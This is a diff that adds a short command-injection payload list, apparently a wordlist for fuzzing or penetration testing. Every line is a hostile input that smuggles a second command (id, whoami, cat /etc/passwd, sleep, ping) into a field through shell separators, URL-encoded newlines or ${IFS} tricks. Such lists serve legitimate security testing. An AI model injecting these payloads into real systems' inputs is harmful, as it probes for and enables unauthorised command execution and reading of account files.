@@ -1,0 +1,21 @@
+# Generic command injection advanced payloads
+;id
+|id
+&&id
+||id
+`id`
+$(id)
+;whoami
+|whoami
+&&whoami
+;cat /etc/passwd
+|cat /etc/passwd
+;sleep 5
+|sleep 5
+&& sleep 5
+;ping -c 5 127.0.0.1
+& ping -n 5 127.0.0.1 &
+%0aid
+%0a/bin/id
+;${IFS}id
+|${IFS}id
